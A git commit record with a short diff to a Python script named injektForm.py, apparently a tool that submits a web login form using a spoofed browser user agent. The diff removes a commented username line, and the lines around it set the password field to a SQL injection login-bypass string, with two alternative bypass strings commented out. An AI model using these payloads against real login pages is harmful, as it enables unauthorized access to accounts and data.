4efe71b4920d56104c95957769139713fccb9c56
gugu <54214369+guguvk@users.noreply.github.com>
2025-01-29 11:41:13 -0600

    injektForm

--- injektForm.py
+++ injektForm.py
@@ -17,7 +17,6 @@ try:
     br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
     br.select_form(nr=0) #debes especificar el formulario al cual se le hara la inyeccion, por defecto esta el principal
-    #br['usuario'] = "admin"
     br['password'] = "' or 1=1 -- -"
     #"' or '1'='1"
     #"\' or\'\'=\'"
